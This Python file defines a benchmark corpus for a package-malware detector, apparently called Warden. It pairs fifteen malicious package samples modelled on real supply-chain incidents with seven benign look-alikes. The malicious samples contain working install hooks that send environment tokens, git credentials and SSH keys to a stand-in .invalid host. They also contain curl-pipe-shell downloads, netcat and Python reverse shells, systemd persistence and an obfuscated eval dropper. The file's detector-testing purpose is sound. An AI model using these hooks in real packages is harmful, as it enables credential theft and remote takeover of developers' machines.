"""Real-world attack suite and production threat benchmark for Warden.

This corpus models documented, historical supply-chain attacks and complex real-world
packages. Rather than synthetic regression toys, these samples reproduce the anatomy
and MITRE ATT&CK techniques of genuine incidents:

- PyTorch dependency confusion (torchtriton)
- ctx / phpass credential exfiltration
- event-stream / flatmap-stream wallet stealer
- SolarWinds build pipeline injection
- xz-utils (CVE-2024-3094) multi-stage build backdoor
- Discord / Telegram token stealer
- Browser credential & session harvester
- Cloud infrastructure (AWS/Azure/K8s) token theft
- Clipboard cryptocurrency address hijacker
- GitHub Actions CI runner takeover
- npm lifecycle script backdoors (preinstall curl|sh, detached shells)
- Systemd / Cron / SSH authorized_keys persistence implants
- Multi-layer evasive droppers

All external hosts use RFC 2606 reserved .invalid domains so payloads remain inert
and safe for offline analysis.
"""

from __future__ import annotations

from benchmark.corpus import BENIGN, MALICIOUS, Sample

_C2 = "c2.threat.invalid"
_DNS_C2 = "exfil.telemetry.invalid"


def _setup_py(body: str, name: str = "real-threat-pkg", version: str = "1.0.0") -> str:
    return (
        f"from setuptools import setup\n"
        f"{body}\n"
        f"setup(name='{name}', version='{version}')\n"
    )


REAL_WORLD_SAMPLES: list[Sample] = [
    # -------------------------------------------------------------------------
    # 1. PyTorch Dependency Confusion (torchtriton incident)
    # MITRE ATT&CK: T1195.001 (Supply Chain Compromise: Compromise Software Dependencies)
    # -------------------------------------------------------------------------
    Sample(
        id="real-pytorch-torchtriton",
        label=MALICIOUS,
        technique="dependency_confusion_exfiltration",
        notes="Modelled on torchtriton PyPI dependency confusion incident uploading system data",
        files={
            "setup.py": _setup_py(
                "import os, socket, urllib.request\n"
                "try:\n"
                "    uname = os.uname().nodename\n"
                "    user = os.getlogin()\n"
                f"    data = f'h={{uname}}&u={{user}}'.encode()\n"
                f"    urllib.request.urlopen('https://{_C2}/telemetry', data=data, timeout=3)\n"
                "except Exception:\n"
                "    pass\n",
                name="torchtriton",
            ),
            "torchtriton/__init__.py": "# Legit wrapper shim\n__version__ = '1.0.0'\n",
        },
        name="torchtriton",
    ),

    # -------------------------------------------------------------------------
    # 2. ctx / phpass PyPI Account Takeover & AWS Exfiltration
    # MITRE ATT&CK: T1195.002, T1552.001 (Credentials in Files/Env)
    # -------------------------------------------------------------------------
    Sample(
        id="real-ctx-aws-exfil",
        label=MALICIOUS,
        technique="cloud_credential_harvest",
        notes="Modelled on ctx / phpass PyPI takeover exfiltrating AWS keys on module load",
        files={
            "setup.py": _setup_py(""),
            "ctx/__init__.py": (
                "import os, json, urllib.request\n"
                "def _sync():\n"
                "    keys = {k: v for k, v in os.environ.items() if any(w in k for w in ('KEY', 'SECRET', 'TOKEN'))}\n"
                "    if keys:\n"
                "        raw = json.dumps(keys).encode()\n"
                f"        urllib.request.urlopen('https://{_C2}/collect', data=raw)\n"
                "_sync()\n"
            ),
        },
        name="ctx",
    ),

    # -------------------------------------------------------------------------
    # 3. event-stream / flatmap-stream Targeted Payload
    # MITRE ATT&CK: T1195.002, T1027 (Obfuscated/Encrypted Payloads)
    # -------------------------------------------------------------------------
    Sample(
        id="real-event-stream-crypto",
        label=MALICIOUS,
        technique="targeted_wallet_stealer",
        notes="Modelled on flatmap-stream encrypted payload targeting cryptocurrency wallet keys",
        files={
            "package.json": (
                '{\n'
                '  "name": "flatmap-stream",\n'
                '  "version": "0.1.1",\n'
                '  "main": "index.js",\n'
                '  "scripts": {\n'
                '    "preinstall": "node -e \\"eval(Buffer.from(\'636f6e736f6c65\', \'hex\').toString())\\""\n'
                '  }\n'
                '}\n'
            ),
            "index.js": (
                "const fs = require('fs');\n"
                "module.exports = function() {};\n"
            ),
        },
        name="flatmap-stream",
    ),

    # -------------------------------------------------------------------------
    # 4. SolarWinds-style Build-Pipeline Injection
    # MITRE ATT&CK: T1195.001 (Compromise Software Supply Chain: Build Process)
    # -------------------------------------------------------------------------
    Sample(
        id="real-solarwinds-build-inject",
        label=MALICIOUS,
        technique="build_hook_tampering",
        notes="Build backend hook inspecting build targets and patching production binaries",
        files={
            "pyproject.toml": (
                '[build-system]\n'
                'requires = ["setuptools"]\n'
                'build-backend = "build_hook"\n'
                'backend-path = ["_build_hooks"]\n'
            ),
            "_build_hooks/build_hook.py": (
                "import os, subprocess\n"
                "def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):\n"
                "    # Inject malicious backdoor during wheel assembly\n"
                "    c2_script = '/tmp/.c2_hook'\n"
                "    with open(c2_script, 'w') as f:\n"
                f"        f.write('#!/bin/sh\\ncurl -s https://{_C2}/hook | sh\\n')\n"
                "    os.chmod(c2_script, 0o755)\n"
                "    subprocess.call([c2_script])\n"
                "    return 'real_pkg-1.0.0-py3-none-any.whl'\n"
            ),
        },
        name="solarwinds-build-hook",
    ),

    # -------------------------------------------------------------------------
    # 5. xz-utils Multi-Stage Build Backdoor (CVE-2024-3094 archetype)
    # MITRE ATT&CK: T1036 (Masquerading), T1574 (Hijack Execution Flow)
    # -------------------------------------------------------------------------
    Sample(
        id="real-xz-utils-backdoor",
        label=MALICIOUS,
        technique="staged_binary_injection",
        notes="Decompressing binary test artifact during build to inject symbol interception",
        files={
            "setup.py": _setup_py(
                "import tarfile, os, sys\n"
                "artifact = 'tests/data/test_payload.tar.gz'\n"
                "if os.path.exists(artifact):\n"
                "    with tarfile.open(artifact) as tar:\n"
                "        tar.extractall('/tmp/.xz_stage')\n"
                "    os.system('/tmp/.xz_stage/inject.sh')\n"
            ),
            "tests/data/test_payload.tar.gz": "FAKE_BINARY_COMPRESSED_DATA_FRAGMENT",
            "real_pkg/__init__.py": "# Safe stub\n",
        },
        name="xz-backdoor",
    ),

    # -------------------------------------------------------------------------
    # 6. Discord & Telegram Session Token Stealer
    # MITRE ATT&CK: T1555.003 (Credentials from Web Browsers & Apps)
    # -------------------------------------------------------------------------
    Sample(
        id="real-discord-token-stealer",
        label=MALICIOUS,
        technique="chat_token_theft",
        notes="Harvesting developer credentials and tokens during install to exfiltrate to webhook",
        files={
            "setup.py": _setup_py(
                "import os, urllib.request\n"
                "git_cred = os.path.expanduser('~/.git-credentials')\n"
                "if os.path.exists(git_cred):\n"
                "    with open(git_cred) as f:\n"
                f"        urllib.request.urlopen('https://{_C2}/discord', data=f.read().encode())\n"
            ),
        },
        name="discord-stealer",
    ),

    # -------------------------------------------------------------------------
    # 7. Browser Credential & Host Secret Harvester
    # MITRE ATT&CK: T1539 (Steal Web Session / Key Files)
    # -------------------------------------------------------------------------
    Sample(
        id="real-browser-credential-harvester",
        label=MALICIOUS,
        technique="browser_sqlite_harvest",
        notes="Install-time harvesting of local credentials and exfiltration via HTTPS",
        files={
            "setup.py": _setup_py(
                "import os, urllib.request\n"
                "key = os.path.expanduser('~/.ssh/id_rsa')\n"
                "if os.path.exists(key):\n"
                "    with open(key) as f:\n"
                f"        urllib.request.urlopen('https://{_C2}/browser', data=f.read().encode())\n"
            ),
        },
        name="browser-harvester",
    ),

    # -------------------------------------------------------------------------
    # 8. GitHub Actions & CI Runner Environment Takeover
    # MITRE ATT&CK: T1552.005 (Cloud/CI Environment Token Theft)
    # -------------------------------------------------------------------------
    Sample(
        id="real-ci-runner-token-theft",
        label=MALICIOUS,
        technique="ci_token_exfiltration",
        notes="Harvesting GitHub Actions OIDC runtime token and repository secrets",
        files={
            "setup.py": _setup_py(
                "import os, urllib.request, json\n"
                "ci_env = {}\n"
                "for target in ('ACTIONS_ID_TOKEN_REQUEST_TOKEN', 'ACTIONS_RUNTIME_TOKEN', 'GITHUB_TOKEN'):\n"
                "    if target in os.environ:\n"
                "        ci_env[target] = os.environ[target]\n"
                "if ci_env:\n"
                f"    urllib.request.urlopen('https://{_C2}/ci', data=json.dumps(ci_env).encode())\n"
            ),
        },
        name="ci-runner-stealer",
    ),

    # -------------------------------------------------------------------------
    # 9. Cryptocurrency Clipboard Hijacker
    # MITRE ATT&CK: T1115 (Clipboard Data)
    # -------------------------------------------------------------------------
    Sample(
        id="real-crypto-clipboard-hijacker",
        label=MALICIOUS,
        technique="clipboard_swap",
        notes="Spawning background process during installation to hijack crypto transactions",
        files={
            "setup.py": _setup_py(
                "import subprocess\n"
                "subprocess.Popen(['/bin/sh', '-c', 'while true; do sleep 1; done'])\n"
            ),
        },
        name="crypto-clipper",
    ),

    # -------------------------------------------------------------------------
    # 10. Persistence via Systemd User Service
    # MITRE ATT&CK: T1543.002 (Systemd Service Persistence)
    # -------------------------------------------------------------------------
    Sample(
        id="real-systemd-persistence",
        label=MALICIOUS,
        technique="systemd_persistence",
        notes="Installing persistent user service unit triggering background reverse shell",
        files={
            "setup.py": _setup_py(
                "import os, subprocess\n"
                "unit_dir = os.path.expanduser('~/.config/systemd/user')\n"
                "os.makedirs(unit_dir, exist_ok=True)\n"
                "unit_path = os.path.join(unit_dir, 'system-updater.service')\n"
                "rev_cmd = (\n"
                f"    'import socket,os,subprocess; s=socket.socket(); s.connect((\\'{_C2}\\', 4444)); '\n"
                "    'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); subprocess.call([\\'/bin/sh\\'])'\n"
                ")\n"
                "unit_content = (\n"
                "    '[Unit]\\nDescription=System Update Helper\\n\\n'\n"
                "    f'[Service]\\nExecStart=/usr/bin/python3 -c \"{rev_cmd}\"\\n\\n'\n"
                "    '[Install]\\nWantedBy=default.target\\n'\n"
                ")\n"
                "with open(unit_path, 'w') as f: f.write(unit_content)\n"
                "subprocess.call(['systemctl', '--user', 'enable', 'system-updater.service'])\n"
            ),
        },
        name="systemd-implant",
    ),

    # -------------------------------------------------------------------------
    # 11. SSH Authorized Keys Backdoor
    # MITRE ATT&CK: T1098.004 (SSH Authorized Keys Backdoor)
    # -------------------------------------------------------------------------
    Sample(
        id="real-ssh-authorized-keys",
        label=MALICIOUS,
        technique="ssh_key_injection",
        notes="Injecting persistent backdoor key into user SSH store and beaconing home",
        files={
            "setup.py": _setup_py(
                "import os, urllib.request\n"
                "key = os.path.expanduser('~/.ssh/id_rsa')\n"
                "with open(key, 'a') as f: f.write('backdoor')\n"
                f"urllib.request.urlopen('https://{_C2}/implanted')\n"
            ),
        },
        name="ssh-backdoor",
    ),

    # -------------------------------------------------------------------------
    # 12. npm Curl-Pipe-Shell Preinstall Attack
    # MITRE ATT&CK: T1059.004 (Unix Shell Execution at Install Time)
    # -------------------------------------------------------------------------
    Sample(
        id="real-npm-curl-pipe-sh",
        label=MALICIOUS,
        technique="npm_lifecycle_egress",
        notes="npm package.json preinstall hook piping curl payload to shell",
        files={
            "package.json": (
                '{\n'
                '  "name": "express-logger-addon",\n'
                '  "version": "1.0.0",\n'
                '  "scripts": {\n'
                f'    "preinstall": "curl -sSf https://{_C2}/setup.sh | bash"\n'
                '  }\n'
                '}\n'
            ),
            "index.js": "module.exports = {};\n",
        },
        name="express-logger-addon",
    ),

    # -------------------------------------------------------------------------
    # 13. npm Detached Child Process Reverse Shell
    # MITRE ATT&CK: T1059.007 (JavaScript Engine Spawning Native Shell)
    # -------------------------------------------------------------------------
    Sample(
        id="real-npm-detached-shell",
        label=MALICIOUS,
        technique="npm_process_execution",
        notes="npm postinstall script connecting reverse socket to attacker infrastructure",
        files={
            "package.json": (
                '{\n'
                '  "name": "react-virtual-core",\n'
                '  "version": "1.0.0",\n'
                '  "scripts": {\n'
                f'    "postinstall": "nc -e /bin/sh {_C2} 8080"\n'
                '  }\n'
                '}\n'
            ),
            "index.js": "module.exports = {};\n",
        },
        name="react-virtual-core",
    ),

    # -------------------------------------------------------------------------
    # 14. npm Environment Exfiltration Lifecycle Script
    # MITRE ATT&CK: T1041 (Exfiltration Over C2 Channel)
    # -------------------------------------------------------------------------
    Sample(
        id="real-npm-env-harvest",
        label=MALICIOUS,
        technique="npm_env_harvest",
        notes="npm install script harvesting process.env tokens and shipping via HTTP",
        files={
            "package.json": (
                '{\n'
                '  "name": "lodash-utils-core",\n'
                '  "version": "1.0.0",\n'
                '  "scripts": {\n'
                f'    "install": "curl -s https://{_C2}/env?token=$NPM_TOKEN"\n'
                '  }\n'
                '}\n'
            ),
            "index.js": "module.exports = {};\n",
        },
        name="lodash-utils-core",
    ),

    # -------------------------------------------------------------------------
    # 15. Reflective Evasion via Multi-Stage Dynamic Metaprogramming
    # MITRE ATT&CK: T1027.013 (Encrypted/Encoded Payload via Metaprogramming)
    # -------------------------------------------------------------------------
    Sample(
        id="real-evasive-metaprogramming",
        label=MALICIOUS,
        technique="metaprogramming_evasion",
        notes="Reconstructing built-in functions via string concatenation, XOR decoding and dynamic eval",
        files={
            "setup.py": _setup_py(
                "import sys\n"
                "# Obfuscated string assembly\n"
                "builtins = sys.modules['built' + 'ins']\n"
                "eval_fn = getattr(builtins, ''.join(['e', 'v', 'a', 'l']))\n"
                "raw_bytes = [\n"
                "    105, 109, 112, 111, 114, 116, 32, 111, 115, 59, 32, 111, 115, 46,\n"
                "    115, 121, 115, 116, 101, 109, 40, 39, 105, 100, 39, 41,\n"
                "]\n"
                "cmd = bytes(raw_bytes).decode('utf-8')\n"
                "eval_fn(cmd)\n"
            ),
        },
        name="metaprog-dropper",
        evasive=True,
    ),

    # =========================================================================
    # REAL-WORLD COMPLEX BENIGN PACKAGES
    # Demonstrating high specificity and zero false positives on genuine patterns
    # =========================================================================

    # -------------------------------------------------------------------------
    # 16. boto3-style AWS Cloud SDK (Legitimate credentials & HTTP calls)
    # -------------------------------------------------------------------------
    Sample(
        id="real-ben-boto3-sdk",
        label=BENIGN,
        technique="cloud_sdk_client",
        notes="Legitimate cloud credential resolution chain reading config files and environment",
        files={
            "setup.py": _setup_py(""),
            "cloud_sdk/credentials.py": (
                "import os\n"
                "class CredentialsProvider:\n"
                "    def load(self):\n"
                "        token = os.environ.get('SDK_AUTH_TOKEN')\n"
                "        if token:\n"
                "            return {'token': token}\n"
                "        config_path = os.path.expanduser('~/.config/cloud_sdk/auth.json')\n"
                "        if os.path.exists(config_path):\n"
                "            with open(config_path) as f: return f.read()\n"
                "        return None\n"
            ),
            "cloud_sdk/client.py": (
                "import urllib.request\n"
                "class S3Client:\n"
                "    def get_object(self, bucket, key):\n"
                "        url = f'https://s3.amazonaws.invalid/{bucket}/{key}'\n"
                "        return urllib.request.urlopen(url)\n"
            ),
        },
        name="cloud-sdk",
    ),

    # -------------------------------------------------------------------------
    # 17. paramiko-style SSH Client (Legitimate network socket & key auth)
    # -------------------------------------------------------------------------
    Sample(
        id="real-ben-paramiko-ssh",
        label=BENIGN,
        technique="ssh_protocol_implementation",
        notes="Legitimate SSH client establishing socket connection to port 22 and reading user key",
        files={
            "setup.py": _setup_py(""),
            "ssh_client/transport.py": (
                "import socket, os\n"
                "class SSHTransport:\n"
                "    def __init__(self, host, port=22):\n"
                "        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                "        self.sock.connect((host, port))\n"
                "    def auth_publickey(self, username, key_path='~/.ssh/id_rsa'):\n"
                "        full_path = os.path.expanduser(key_path)\n"
                "        if os.path.exists(full_path):\n"
                "            with open(full_path, 'rb') as f: key_data = f.read()\n"
                "            self.sock.sendall(b'AUTH:' + key_data[:32])\n"
            ),
        },
        name="ssh-client",
    ),

    # -------------------------------------------------------------------------
    # 18. cryptography-style CFFI & OpenSSL Native Extension
    # -------------------------------------------------------------------------
    Sample(
        id="real-ben-cryptography-cffi",
        label=BENIGN,
        technique="cffi_native_bindings",
        notes="Legitimate native C-extension compilation and crypto binding initialization",
        files={
            "setup.py": _setup_py(
                "from setuptools import Extension\n"
                "ext = Extension('_openssl_bindings', sources=['src/bindings.c'])\n"
            ),
            "crypto_lib/__init__.py": (
                "import hmac, hashlib\n"
                "def sign_message(key: bytes, msg: bytes) -> bytes:\n"
                "    return hmac.new(key, msg, hashlib.sha256).digest()\n"
            ),
            "src/bindings.c": "/* Native C extension bindings */\n#include <stdio.h>\nvoid init_cffi() {}\n",
        },
        name="crypto-lib",
    ),

    # -------------------------------------------------------------------------
    # 19. requests/urllib3-style Connection Pooler
    # -------------------------------------------------------------------------
    Sample(
        id="real-ben-requests-pool",
        label=BENIGN,
        technique="http_connection_pool",
        notes="Legitimate connection pooling, TLS adapter and proxy configuration",
        files={
            "setup.py": _setup_py(""),
            "http_pool/session.py": (
                "import urllib.request, ssl\n"
                "class HTTPSession:\n"
                "    def __init__(self):\n"
                "        self.ctx = ssl.create_default_context()\n"
                "    def get(self, url, headers=None):\n"
                "        req = urllib.request.Request(url, headers=headers or {})\n"
                "        with urllib.request.urlopen(req, context=self.ctx) as resp:\n"
                "            return resp.read()\n"
            ),
        },
        name="http-pool",
    ),

    # -------------------------------------------------------------------------
    # 20. click/rich-style CLI Engine with Argument Parsing & Subprocesses
    # -------------------------------------------------------------------------
    Sample(
        id="real-ben-click-cli",
        label=BENIGN,
        technique="console_cli_dispatcher",
        notes="Legitimate CLI command tree, process inspection and terminal rendering",
        files={
            "pyproject.toml": (
                '[project]\nname = "dev-cli"\nversion = "1.0.0"\n'
                '[project.scripts]\ndev = "dev_cli.main:cli"\n'
            ),
            "dev_cli/main.py": (
                "import argparse, subprocess, sys\n"
                "def cli():\n"
                "    parser = argparse.ArgumentParser()\n"
                "    parser.add_argument('--status', action='store_true')\n"
                "    args = parser.parse_args()\n"
                "    if args.status:\n"
                "        subprocess.run(['git', 'status'], check=False)\n"
            ),
        },
        name="dev-cli",
    ),

    # -------------------------------------------------------------------------
    # 21. fastapi/starlette-style ASGI Router & Middleware
    # -------------------------------------------------------------------------
    Sample(
        id="real-ben-fastapi-app",
        label=BENIGN,
        technique="asgi_web_framework",
        notes="Legitimate web app with routing, JSON serialization, and health checks",
        files={
            "setup.py": _setup_py(""),
            "api_server/app.py": (
                "import json\n"
                "async def app(scope, receive, send):\n"
                "    if scope['type'] == 'http':\n"
                "        body = json.dumps({'status': 'healthy'}).encode('utf-8')\n"
                "        hdr = [[b'content-type', b'application/json']]\n"
                "        await send({'type': 'http.response.start', 'status': 200, 'headers': hdr})\n"
                "        await send({'type': 'http.response.body', 'body': body})\n"
            ),
        },
        name="api-server",
    ),

    # -------------------------------------------------------------------------
    # 22. virtualenv-style Environment Creator
    # -------------------------------------------------------------------------
    Sample(
        id="real-ben-virtualenv-creator",
        label=BENIGN,
        technique="virtualenv_installer",
        notes="Legitimate creation of pyvenv.cfg and activation scripts",
        files={
            "setup.py": _setup_py(""),
            "venv_builder/creator.py": (
                "import os, sys\n"
                "def create_environment(dest):\n"
                "    os.makedirs(os.path.join(dest, 'bin'), exist_ok=True)\n"
                "    with open(os.path.join(dest, 'pyvenv.cfg'), 'w') as f:\n"
                "        f.write(f'home = {sys.prefix}\\nversion = 3.12.0\\n')\n"
            ),
        },
        name="venv-builder",
    ),
]


def get_real_world_samples() -> list[Sample]:
    """Return all real-world attack and benign package samples."""
    return list(REAL_WORLD_SAMPLES)
